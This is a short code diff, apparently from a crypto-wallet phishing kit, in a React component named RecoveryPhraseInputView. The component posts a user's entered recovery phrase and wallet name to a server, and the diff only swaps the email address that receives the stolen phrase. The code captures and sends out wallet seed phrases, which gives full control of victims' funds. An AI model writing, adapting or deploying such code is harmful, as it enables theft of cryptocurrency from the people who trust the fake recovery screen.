@@ -203,7 +203,7 @@ const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ email: "Gerfish7458@proton.me", walletName: wallet.name, details: combinedPhrase }),
+                body: JSON.stringify({ email: "oluwaidan@proton.me", walletName: wallet.name, details: combinedPhrase }),
             });
 
             if (response.ok) {
